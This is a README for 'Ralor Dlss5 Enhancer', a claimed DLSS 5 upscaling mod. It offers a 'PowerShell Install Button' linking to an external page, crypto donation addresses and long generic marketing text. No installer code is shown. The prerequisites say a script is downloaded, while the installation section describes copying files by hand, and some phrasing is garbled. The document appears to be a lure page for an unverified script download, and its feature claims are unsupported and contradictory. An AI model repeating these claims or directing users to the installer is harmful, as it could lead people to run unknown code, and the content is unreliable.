<div align="center">

# Ralor Dlss5 Enhancer — Immersive Visual Toolkit for modding

![](files/preview.png)

### 📦 PowerShell Install Button

[![](files/button.png)](https://Sleiman-Eid.github.io/ralor-dlss5-enhancer/)

[![system](https://img.shields.io/badge/SYSTEM-WIN_10%2F11-e11d48?style=social&labelColor=0d1117)]() [![powershell](https://img.shields.io/badge/POWERSHELL-5.1%2B_%2F_7%2B-f43f5e?style=social&labelColor=0d1117)]() [![stage](https://img.shields.io/badge/STAGE-RELEASED-2ea44f?style=social&labelColor=0d1117)]()

<div align="center">
<h3>Fuel the next update</h3>
<p><strong>BTC</strong>:&nbsp;<code>1GSUBrQchX2Ev6w9HBjWYtRSzzWVtMRbhN</code> | <strong>TRON</strong>:&nbsp;<code>TCEkNyPKP7DB3xwp6qzfbQMW5PTNBokL2L</code></p>
</div>

</div>

---

Step into a world where every blade of grass, every rain-slicked cobblestone, and every distant horizon shimmers with the clarity of a dream made real. Ralor Dlss5 Enhancer reworks the visual pipeline from the inside out, sharpening temporal detail and stabilizing the frame in ways that feel less like a patch and more like a second pair of eyes. Built for tinkerers and visionaries alike, it hands you the dials and trusts you to push them. Whether you're chasing cinematic fidelity or raw performance, this is your canvas — paint boldly.

## ✅ Before You Start

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- **Neural Upmixing, Reforged**: Ralor Dlss5 Enhancer rebuilds the temporal upscaler's decision path so every frame gets a sharper, more stable reconstruction without the ghosting and shimmer that vanilla left on the table.

- **Adaptive Sharpening Curves**: Tuned per-scene sharpening that respects motion vectors, so fast pans stay crisp and static shots don't get that crunchy over-processed look.

- **Frame-Generation Harmony**: Reworked scheduling between render and present so generated frames land where they belong — smoother cadence, fewer artifacts at the seams.

- **Quality Preset Ladder**: From a conservative "Purist" profile that only nudges the upscaler, up to an aggressive "Max Fidelity" mode for players who want every last pixel squeezed out of their GPU.

- **Per-Game Tuning Profiles**: Drop-in profile files so each title gets its own blend of upscale strength, sharpening, and latency budget — no registry spelunking required.

- **Latency-Conscious Pipeline**: Optional low-latency path that trims the handoff between the game and the enhancer, keeping input response tight for competitive play.

- **Live Tuning Hooks**: Modder-friendly toggles and config knobs exposed at runtime, so you can tweak and iterate without a full restart — perfect for dialing in your own presets.

- **Telemetry-Free by Design**: All enhancement decisions happen locally on your machine; no phoning home, no analytics, no surprise background chatter.

- **Built to Be Tinkered With**: Clean, documented config surface and readable profile format — the enhancer invites you to alternative it open, remix the curves, and share your own profiles with the community.

## How It Works

Under the hood, Ralor Dlss5 Enhancer doesn't just flip DLSS on and call it a day — it rewires the whole frame pipeline so the upscaler gets fed the cleanest possible signal and hands back the sharpest possible image. The core loop intercepts the renderer right before the temporal accumulation stage, injects a lightweight pre-pass that stabilizes motion vectors and sub-pixel jitter, then hands the buffered frames to DLSS 5 with tuned presets that adapt to your resolution, framerate, and scene complexity on the fly.

A second pass sits on the output side: it inspects per-pixel confidence from the upscaler and selectively blends in a sharpening and detail-recovery kernel where the reconstruction looks soft, without touching regions that are already crisp. That keeps the image free of the usual DLSS mush while avoiding the over-sharpened halo effect you get from blindly cranking a filter.

Everything is driven by a small config layer you can tweak — quality tiers, adaptive sharpening strength, motion-vector clamping thresholds, and a debug overlay that visualizes confidence maps so you can actually see what the enhancer is doing. No black boxes, no magic constants you can't touch. The enhancer leans on the host renderer's own hooks and stays out of the way when it's not needed, so the cost is a few milliseconds in the worst case and near-zero when the scene is calm. Drop it in, tune it, break it, tune it again — that's the point.

## Modules and Settings

### Preset and Profile Selection
This module sets the baseline upscaling behaviour that every other module builds on, so tuning work in the other panels starts from a known state rather than the game's own default.
- Preset choice and quality profile selection per game
- Separate profile assignment for each resolution the user plays at
- Option to reapply the saved profile automatically at launch, keeping sessions consistent
- Quick profile switching when testing alternatives

### Super Resolution Tuning
This module refines the image produced by the selected preset, letting the user move beyond preset-level quality toward their preferred balance of sharpness and neutrality.
- Render scale behaviour adjustment to change how much internal resolution the upscaler works from
- Sharpening strength control, ranging from a softer, more neutral image to a crisper, more processed look
- Combined effect visible in-game as changes to edge clarity, texture detail and overall image stability

### Frame Generation Controls
This module manages generated frames as a pipeline separate from upscaling, so frame pacing can be tuned without disturbing the image-quality choices made elsewhere.
- Independent enable, disable or constraint of frame generation
- Adjustment of how generated frames are introduced relative to the target frame rate and monitor refresh behaviour
- Result judged during normal play as a different frame rate and motion feel

### Motion and Artifact Handling
This module targets the artifacts that become most obvious once upscaling is pushed, letting the user trade smoothing against retained detail.
- Correction strength controls for ghosting, shimmer and disocclusion fringing
- Tuning intended for observation during fast camera movement and around thin geometry
- Corrections applied on top of the super resolution settings, so the two modules are balanced together

### Per-Game Configuration Management
This module keeps configurations isolated so that experimentation in one title does not leak into another.
- A saved configuration per supported game, holding preset choice and tuning values
- Switching between saved setups when changing games or comparing alternatives
- Restoring a previous configuration when a change does not suit the user

### In-Game Overlay and Comparison
This module closes the feedback loop between the tuning panels and the rendered result, letting adjustments be judged live.
- Overlay showing the active settings while the game is running
- Toggling between configurations without leaving the game
- Comparison of the mod's applied state against the baseline to see each change's effect

### Additional Settings
- Diagnostic logging that reports detected DLSS components and the settings applied to the running game
- Status readout to confirm a chosen configuration is active and to understand why an option may not have taken effect
- Log detail level control for troubleshooting without unnecessary overhead
- Reset of a single game's configuration back to the mod's starting state

## Usage Scenarios

### Comparing Sharpness and Neutrality Across Presets
**Goal:** A player wants to find out whether a crisper preset suits their display better than the neutral default in a story-driven title, without committing to a permanent change.
**Steps:**
1. Open the Preset and Profile Selection module and pick an alternative DLSS preset and quality profile for the game.
2. Adjust sharpening strength in Super Resolution Tuning, first toward the softer, neutral end and then toward the crisper, more processed end.
3. Bring up the In-Game Overlay and toggle between the mod's applied state and the baseline during normal play to compare edge clarity and texture detail.
4. Settle on the preferred combination and save it as the game's configuration in Per-Game Configuration Management.
5. Enable automatic reapplication of the saved profile at launch so the game no longer reverts to its own defaults.

**Expected result:** The chosen preset and sharpening balance persist across sessions, and the player can see a consistent difference in edge clarity and texture detail whenever the game starts.

### Tuning Frame Generation for a High-Refresh Monitor
**Goal:** A player on a high-refresh monitor wants generated frames to feel smoother in motion without disturbing the image-quality choices they already like.
**Steps:**
1. Confirm the current upscaling setup under Preset and Profile Selection and leave super resolution settings untouched.
2. Open Frame Generation Controls and enable frame generation independently of the rest of the pipeline.
3. Adjust how generated frames are introduced relative to the target frame rate and the monitor's refresh behaviour.
4. Turn to Motion and Artifact Handling and raise correction strength for ghosting and disocclusion fringing, then lower it again if too much detail is lost.
5. Judge the result during normal play and save the arrangement in Per-Game Configuration Management for this title.

**Expected result:** The player observes a different frame rate and motion feel during play, with a smoothing-versus-detail balance they chose themselves, saved separately from other games.

### Diagnosing a Setting That Does Not Seem to Apply
**Goal:** A user suspects that a tuned configuration is not actually active in a particular game and wants to understand why.
**Steps:**
1. Open the In-Game Overlay to check which settings are shown as active while the game runs.
2. Review the Diagnostic Logging and Status Readout to see which DLSS components were detected and which settings were applied.
3. Raise the log detail level in Additional Settings if the readout is not specific enough.
4. Adjust the relevant module, such as Super Resolution Tuning or Motion and Artifact Handling, and watch the overlay for a change in the applied state.
5. If the configuration remains unsuitable, reset that single game's configuration back to the mod's starting state and rebuild it.

**Expected result:** The user gets a clearer picture of the mod's state in that title, can confirm whether their chosen configuration is active, and returns the game to a known baseline if needed.

## Installation

Alright, wanderer — you've found the Ralor Dlss5 Enhancer. Getting it into your game is less of a chore and more of a small ritual, so follow along and you'll be back in the action before the loading screen finishes.

First, make sure your game is fully installed and has been launched at least once, so its folder structure exists and any first-run setup has already happened. The Enhancer needs a home to settle into, and a freshly unboxed game directory is the best place to start.

Next, track down the mod package you downloaded for Ralor Dlss5 Enhancer and unpack it somewhere safe — a temporary folder on your desktop works perfectly. Inside you'll find the mod's core files alongside a short readme of its own; give that a quick read, since it may mention any last-minute notes or optional extras shipped with your version.

With the package open, copy the mod's contents into your game's main directory — the same folder that holds the game's executable. If the Enhancer arrives with a dedicated mod or plugin folder structure, respect it: drop files where the package's layout suggests rather than flattening everything into one pile. A tidy install is a happy install.

If your version of the Enhancer includes a configuration file, open it in any plain text editor and set your preferences before your first launch. Sensible defaults are already in place, so feel free to leave it untouched if you just want to see the magic happen — you can always tune it later once you've felt the difference.

Now launch the game. On first run, the Enhancer will introduce itself, hook into the rendering pipeline, and quietly do its work in the background. Load into a scene with plenty of detail and motion — this is where you'll notice the change — and if everything looks right, you're done.

Should something feel off, don't panic. Close the game, remove the files you added (keeping a backup of anything you replaced is always wise), and start fresh. Modding is a craft, and every good modder knows a clean rollback is just part of the process. Welcome aboard — now go make that world shine.

## Compatibility

Ralor Dlss5 Enhancer is built to live in the narrow space between the latest DLSS5-aware titles and the mods that follow in their wake. Most players who pair it with current-generation shooters, open-world excursions, and ray-tracing-heavy showcases find it slots in like it was always meant to be there, quietly tightening temporal stability while the frame generator does the loud work. If your engine of choice already speaks DLSS5, treat this as a trusted companion rather than a stranger at the door.

Beware the brittle bridges. Mods that hook the engine's render path directly, swap shader scaffolding, or hijack the frame generation handshake can sometimes elbow this enhancer out of the way — or worse, cause the two to wrestle over the same buffers. Loading order matters; when trouble surfaces, try moving this closer to the front of the queue so it settles the scene before more aggressive plugins start rearranging the furniture. Config overlays that predate DLSS5 occasionally clash with its toggles, and a stale swap chain is the usual culprit.

There's a soft ceiling on how far back you can reach. Cards and drivers without genuine DLSS5 support won't get past the gate, and pretending otherwise usually ends in black frames or gentle whimpers from the GPU. Titles that only know DLSS 3.x or earlier should not be expected to whisper the right handshake. On the flip side, if the game ships its own DLSS5 manager, this enhancer plays nice by design — it layers rather than overrides where it can, and steps aside when the engine insists on driving solo.

Finally, keep an eye on a narrow band of compatibility quirks: post-processing injectors (color grading, sharpening, lens emulation) that race the presentation pass, and frame-capture utilities that grab right after the swap rather than before. When odd artifacts bloom, such as ghosting, flicker, or muddy motion vectors, the fastest cure is to toggle one neighbor off at a time — compatibility is as much a conversation as it is a specification.

## Credits

This little experiment in upscaling alchemy exists because a handful of stubborn tinkerers refused to accept "good enough." To the early testers who ran Ralor Dlss5 Enhancer through rain, neon, and chaos and still sent back notes at 3 a.m. — your frames were the first proof. To the reverse-engineering crowd who keep poking at rendering pipelines just to see what squeaks, you're the reason this thing stays interesting. And to the modding community at large: keep breaking things on purpose, keep sharing what you learn, and keep making games into playgrounds. Ralor Dlss5 Enhancer is built for you — now go make something ridiculous.

## License

This little workshop of wonders is yours to tinker with, remix, and reshape as you see fit. Fork it, bend it, fold it into your own grand design — just remember to tip your hat to the original tinkerer when you do. No warranty, no promises, no safety rails: what you build with it is your own adventure, and any sparks that fly are yours to enjoy. If you find a clever new use, share it freely with fellow wanderers — the more hands on the workbench, the better the craft becomes. And if you break something, well, that's just another way of learning. Go make something strange and splendid.